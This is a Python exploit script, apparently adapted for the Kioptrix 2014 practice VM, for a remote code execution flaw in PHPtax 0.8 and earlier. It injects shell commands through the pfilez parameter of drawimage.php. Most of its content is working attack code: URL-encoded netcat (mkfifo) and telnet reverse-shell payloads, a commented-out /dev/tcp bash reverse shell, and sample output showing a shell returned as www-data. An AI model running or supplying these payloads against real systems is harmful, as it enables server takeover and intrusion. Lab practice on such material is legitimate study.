#!/usr/bin/env python
# PHPtax 0.8 <= Remote Code Execution Exploit
# Author: infodox // Discovered by Jean Pascal Pereira
# Site: insecurety.net
# Twitter: @info_dox
# Reference/Advisory: http://www.exploit-db.com/exploits/21665/
import sys
import requests
import urllib

def banner():
    print """
   PHPTax <= 0.8 Remote Code Execution Exploit
   Original Discovery by Jean Pascal Pereira
   This PoC written by infodox - http://insecurety.net

   I got this script from carnal0wnage's github repo.
   https://github.com/carnal0wnage/exploits-1/blob/master/phptax_rce.py

   IMPORTANT NOTE:
   I (SecNigma) changed the script to accomodate two separate payloads ( netcat without -e and telnet To work well with Kioptrix 2014 VM).
   Now the exploit code delivers a reverse shell,but we might need a netcat listener with -k flag set if the script depends on method #2:)

   eg: nc -lkvnp 9001
   without -k flag, the netcat listener might die up on receiving the shell on method #2 (Telnet).

   I have changed the UserAgent as well.
   """
 
if len(sys.argv) != 5:
    banner()
    print "Usage: python2 exploit.py <target> <reverseip> <reverseport> <method-number>"
    print "Where payload is http://whatever.com/phptax - path to PHPtax with NO trailing /"
    print "E.g: http://192.168.1.4:8080/phptax with NO trailing /"
    print "This script has two separate payloads."
    print "Method #1: Netcat without -e"
    print "Method #2: Telnet"
    print "Specify the required method with the method number (1 or 2)"
    print "Example: python2 exploit.py http://192.168.1.4:8080/phptax 192.168.1.9 9001 1"
    print "For exploit using Netcat without -e method"
    print "Also, keep in mind that The Telnet payload (Method #2) was a hacky addition and i am not sure about the stability or reliability of it."
    print "Use Method #2 cautiously."
    sys.exit(1)
 
banner()
target = sys.argv[1]
reverseip = sys.argv[2]
reverseport = sys.argv[3]
method= sys.argv[4]

#Old Netcat payload
#payload = '%2Fbin%2Fbash%20%3E%26%20%2Fdev%2Ftcp%2F'+reverseip+'%2F'+reverseport+'%200%3E%261'

if(method=="1"):
    #Payload using netcat without -e
    payload= "%20sh%20-c%20'(rm%20%2ftmp%2ff%3bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff%7c%2fbin/sh%20-i%202%3e%261%7cnc%20"+reverseip+"%20"+reverseport+"%20%3e%2ftmp%2ff)%20'"
elif(method=="2"):
    #New payload using telnet
    payload = "%20sh%20-c%20'(sleep%204566%7ctelnet%20"+reverseip+"%20"+reverseport+"%7cwhile%20%3a%20%3b%20do%20sh%20%26%26%20break%3b%20done%202%3e%261%7ctelnet%20"+reverseip+"%20"+reverseport+"%20%3e%2fdev%2fnull%202%3e%261%20)'"


vulnurl = target+'/drawimage.php?pdf=make&pfilez=xxx%3b'+payload+''


print "[*] Target Host: "+target
print "[*] Listener IP: "+reverseip
print "[*] Listener Port: "+reverseport
print "[+] Sending the evil request... may the force be with you!"
print "[+] Don't forget to start the netcat listener WITH -k flag set"
print "[+] E.g: nc -lkvnp 9001"
print "[+] If -k is not set in netcat, then the listener might die."
print "[+] If the script is stuck at this point, chances are you might've got a shell back using the netcat method!"

#Uncomment this, if you are having issues.
#print vulnurl

#UA set to this for solving Kioptrix 2014. Change this if there is any connectivity issues.
useragent="Mozilla/4.0 Mozilla4_browser" 
headers = {
    'User-Agent': useragent
}

#Sending request using method #1 (netat without -e)
requests.get(vulnurl,headers=headers)


print "[?] Gotshell?"


# Comments to denote example working.

''' # In terminal 1... Pwnin!
[infodox@yore-ma:~/dev/misc-exploits]$ python2 phptax_RCE.py http://127.0.0.1:8080/phptax 127.0.0.1 443 1

   PHPTax <= 0.8 Remote Code Execution Exploit
   Original Discovery by Jean Pascal Pereira
   This PoC written by infodox - http://insecurety.net
   Delivers a reverse shell, so have a netcat listening :)
   
[*] Target Host: http://127.0.0.1/phptax
[*] Listener IP: 127.0.0.1
[*] Listener Port: 443
[+] Sending the evil request... may the force be with you!
[+] Don't forget to start the netcat listener WITH -k flag set
[+] E.g: nc -lkvnp 9001
[+] If -k is not set in netcat, then the listener will die.

[?] Gotshell?

[infodox@yore-ma:~/dev/insecurety-research/misc-exploits]$
'''
''' # In terminal 2... Got Shell!
[root@yore-ma:~]# nc -lvp 443 
listening on [any] 443 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 34105
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
^C
[root@yore-ma:~]#
'''


